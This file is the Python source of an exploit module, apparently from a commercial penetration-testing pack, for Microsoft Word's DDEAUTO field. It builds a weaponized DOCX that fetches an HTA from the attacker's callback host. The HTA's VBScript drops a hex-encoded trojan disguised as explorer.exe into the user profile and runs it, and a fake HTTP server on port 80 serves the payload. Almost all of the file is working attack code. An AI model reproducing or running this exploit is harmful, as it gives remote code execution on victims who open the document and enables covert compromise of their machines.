#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2017
#

import sys
import thread
import zipfile

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from canvasexploit import canvasexploit
from libs.canvasos import *
from MOSDEF import pelib 
from libs.spkproxy import header, body

import canvasengine
import struct
import os


NAME = "Microsoft Word DDEAUTO Code Execution Vulnerability"

DESCRIPTION = "Code execution in Microsoft Word via DDEAUTO field"
DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "Microsoft"
DOCUMENTATION["Date public"] = "2017.10.09"
DOCUMENTATION["VersionsAffected"] = "Word"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"] = "https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"
DOCUMENTATION["Notes"] = ""

VERSION = "0.1"

GTK2_DIALOG = "dialog.glade2"

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]

NOTES="""
"""


class theexploit(tcpexploit):
	def __init__(self):
		tcpexploit.__init__(self)        
		
		self.name = NAME
		self.docxname = "d2sec.docx"		
		self.trojanname = "index.hta"
		self.useSSL = 0
		
		return
        
	# Create the hta file with the embedded binary
	def file4hta(self, exename):
		evilprog = "explorer.exe"
		e = []
		
		for a in exename:
			for b in a:
				if b == "\r":
					d = "0d"
				elif b == "\n":
					d = "0a"
				elif b == "\0":
					d = "00"
				else:
					c = hex(ord(b))
					d = c.replace("0x", "")
	
				if len(d) == 1:
					d = "0"+d
	
				e.append(d)
		
		i = 0
		j = 0
		l = len(e)
	
		hta = "<SCRIPT language=vbs>\n\n"
		while 1:
		  hta += " prog = prog & \""
	
		  while i != 24:
		    hta += "%s," % e[j]
		    if j == l-1:
		      break
		    i += 1
		    j += 1
	
		  if j == l-1:
		    hta = hta[:-1] + "\"\n\n"
		    break
		  hta += "\"\n"
		  i = 0
	
		hta += " tmp = Split(prog, \",\")\n"	
		hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
		hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
		hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
		hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
		hta += " Set f = fso.CreateTextFile(path, True)\n\n"
		hta += " For i = 0 To UBound(tmp)\n"
		hta += "   prog = Int(\"&H\" & tmp(i))\n"
		hta += "   f.Write Chr(prog)\n"
		hta += " Next\n\n"
		hta += " f.Close\n"
		hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
		hta += " self.Close\n"
		hta += "</SCRIPT>\n"
	
		return hta 
		
		
	def maketrojan(self):   
		t_os = canvasos("Windows")
		t_os.arch = "X64"
        
		self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
		self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        
		self.htafile = self.file4hta(self.mosdeftrojan)
		file(self.trojanname, "wb").write(self.htafile)
		self.setInfo("%s - done"%(NAME))
		ret = len(self.mosdeftrojan) != 0


	def makesploit(self, clientheader, clientbody):        		
		h = header('SERVER')
		b = body()
		
		self.maketrojan()
		        
		if clientheader.URL.count(self.trojanname):
			self.log("Sending MOSDEF trojan")
			f = open(self.trojanname, "rb")
			sploitstring = f.read()
			f.close()
			os.remove(self.trojanname)
			self.log("Sending %d bytes"%len(sploitstring))
			h.addHeader("Content-type","binary/octet-stream")
			h.addHeader("Connection","close")
			b.setBody(sploitstring)
		
		return h, b


	def neededListenerTypes(self):
		from canvasengine import WIN64MOSDEF_INTEL
		return [WIN64MOSDEF_INTEL]


  #################################################################################################################
  # Code from httpserver.py
	def listen(self):
		#self.getargs()
		s=self.gettcplistener(80, "0.0.0.0")

		if not s:
			self.log("Cannot listen on port 80 - perhaps that port is already bound?")
			return 0
				
		s.set_timeout(5)
		self.s=s
		
		return s 


	def accept(self, s=None ):
		"""
		Try to accept one connection
		returns true if we found one
		"""
		#we loop on this ,so no annoying printouts here
		#self.log("Accepting connection")
		if s==None:
			s=self.s 
		try:
			infd,addr=s.accept()
		except timeoutsocket.Timeout:
			#self.log("Timed out - no accept yet")
			return 
		if infd==-1:
			return
		
		#else we have an infd
		self.handle(infd)
		
		return True #handled connection
      
        
	def handle(self, infd): 
		self.log("Handling connection")
		clientheader = header(state = "SERVER")
		clientheader.ssl = self.ssl
		ret = clientheader.readdata(infd)
		clientbody = body()
        
		if clientheader.gotGoodHeader():
			if clientheader.bodySize()>0 or clientheader.wasChunked:
				self.log("Reading body")
				clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
				self.log("Read body")
		
		self.log("Creating exploit response")
		
		servheader,servbody = self.makesploit(clientheader,clientbody)
		
		self.log("Responding")
		
		bodydata="".join(servbody.data)
		            
		#now we respond...
		response = ""
		response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
	
	
		self.log(response)

		for akey in servheader.headerValuesDict.keys():
			if akey not in [ "Content-Length", "Content-length"]:
				response += servheader.grabHeader(akey)
				
		self.log("Sending header data of %d bytes"%len(response))
		chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
		
		if not chunked:
			response+="Content-Length: "+str(len(bodydata))+"\r\n"
			
		response+="\r\n"
		response+="".join(bodydata)
		self.log("Total response length is %d bytes"%len(response))
		
		try:
			infd.sendall(response)
		except socket.error:
			self.log("Connection closed by peer")
			
		self.log("Response sent")
		infd.close() #connection close - later on we'll keep it.
		
		return 
	#
	#################################################################################################################
        

	def startHTTPServer(self):
		s=self.listen()
        
		if not s:
			self.log("Failed to listen - not running")
			return 0
			
		while 1:
			if self.state==self.HALT:
				self.s.close()
				break
			self.accept()

		self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
        
		return 1

		
	def getArgs(self):
		self.docxname = self.argsDict.get("docxname", self.docxname)		
		return

	def run(self):
		self.getArgs()

		path = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_ddeauto/"
    		
		f = open(path + "document/word/document.xml", "rb")
		docxfile = f.read()
		f.close()
    		
		docxfile = docxfile.replace("PAYLOAD",   "http://" + self.callback.ip + "/" + self.trojanname)

		f = open(path + "document/word/document.xml.tmp", "w")    		
		f.write(docxfile)
		f.close()    		    		

		file = zipfile.ZipFile(path + self.docxname, "w")
		file.write(path + "document/[Content_Types].xml", "[Content_Types].xml", zipfile.ZIP_DEFLATED)
		file.write(path + "document/_rels/.rels", "_rels/.rels", zipfile.ZIP_DEFLATED)
		file.write(path + "document/docProps/app.xml", "docProps/app.xml", zipfile.ZIP_DEFLATED)        
		file.write(path + "document/docProps/core.xml", "docProps/core.xml", zipfile.ZIP_DEFLATED)        
		file.write(path + "document/word/document.xml.tmp", "word/document.xml", zipfile.ZIP_DEFLATED)        
		file.write(path + "document/word/endnotes.xml", "word/endnotes.xml", zipfile.ZIP_DEFLATED)
		file.write(path + "document/word/fontTable.xml", "word/fontTable.xml", zipfile.ZIP_DEFLATED)        
		file.write(path + "document/word/footnotes.xml", "word/footnotes.xml", zipfile.ZIP_DEFLATED)
		file.write(path + "document/word/settings.xml", "word/settings.xml", zipfile.ZIP_DEFLATED)        
		file.write(path + "document/word/styles.xml", "word/styles.xml", zipfile.ZIP_DEFLATED)        
		file.write(path + "document/word/webSettings.xml", "word/webSettings.xml", zipfile.ZIP_DEFLATED)        
		file.write(path + "document/word/_rels/document.xml.rels", "word/_rels/document.xml.rels", zipfile.ZIP_DEFLATED)
		file.write(path + "document/word/media/image1.png", "word/media/image1.png", zipfile.ZIP_DEFLATED)
		file.write(path + "document/word/theme/theme1.xml", "word/theme/theme1.xml", zipfile.ZIP_DEFLATED)                                    		
		file.close()
    		
		os.remove(path + "document/word/document.xml.tmp")

		self.log("New DOCX file %s created" % self.docxname)
		
		thread.start_new_thread(self.startHTTPServer,())
		
		self.log("Fake HTTP server started")

		while 1:
			time.sleep(1)
		
		return 0
		

	def usage(self):        
		print "Usage: %s -l localip -d localport -O dstchm:dest_chm_path [-O useSSL:[0|1]]\n" % sys.argv[0]
		sys.exit(0) 


if __name__=='__main__':
	app = theexploit()
	ret = standard_callback_commandline(app)

